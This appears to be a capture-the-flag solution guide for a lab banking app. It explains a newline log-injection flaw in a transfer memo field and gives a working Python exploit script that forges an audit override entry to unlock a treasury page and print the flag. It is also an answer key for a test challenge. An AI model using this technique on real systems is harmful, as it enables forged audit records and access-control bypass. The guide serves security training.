# A09 Medium: Solution Guide

### Vulnerability Analysis
1. Browse to `/compliance/status` to retrieve the current active compliance token:
   `MD5("APEX_AUDIT_" + YYYYMMDD)`
   The page displays the expected token (e.g. `d41d8cd98f00b204e9800998ecf8427e`).
2. The compliance daemon expects log lines formatted as:
   `[YYYY-MM-DD HH:MM:SS] [AUDIT_OVERRIDE] CLEARANCE_TOKEN=<TOKEN> STATUS=CERTIFIED`
3. In `/transfer`, the `memo` field is concatenated without sanitizing newlines (`\n`).
4. By submitting a memo starting with a newline:
   `\n[2026-09-12 12:00:00] [AUDIT_OVERRIDE] CLEARANCE_TOKEN=<TOKEN> STATUS=CERTIFIED`
   a new, valid-looking record is written to `audit.log`.
5. The compliance monitor reads `audit.log`, detects the forged override, and enables access to `/vault/treasury`.

### Exploit Script
```python
import re
import requests

BASE_URL = "http://127.0.0.1:6026"
s = requests.Session()

# 1. Fetch active daily token from compliance monitor
status_html = s.get(f"{BASE_URL}/compliance/status").text
token_match = re.search(r'Current Active Clearance Token for Today: <strong[^>]*>([0-9a-fA-F]{32})</strong>', status_html)
active_token = token_match.group(1)
print(f"[+] Active Token: {active_token}")

# 2. Inject forged log entry via wire transfer memo
crlf_payload = f"Legitimate Payment\n[2026-09-12 12:00:00] [AUDIT_OVERRIDE] CLEARANCE_TOKEN={active_token} STATUS=CERTIFIED"

s.post(f"{BASE_URL}/transfer", data={
    "beneficiary": "US89APEX009218491823",
    "amount": "1000",
    "memo": crlf_payload
})

# 3. Retrieve Flag from Treasury Vault
vault_html = s.get(f"{BASE_URL}/vault/treasury").text
flag = re.search(r"RTSA\{[^}]+\}", vault_html).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
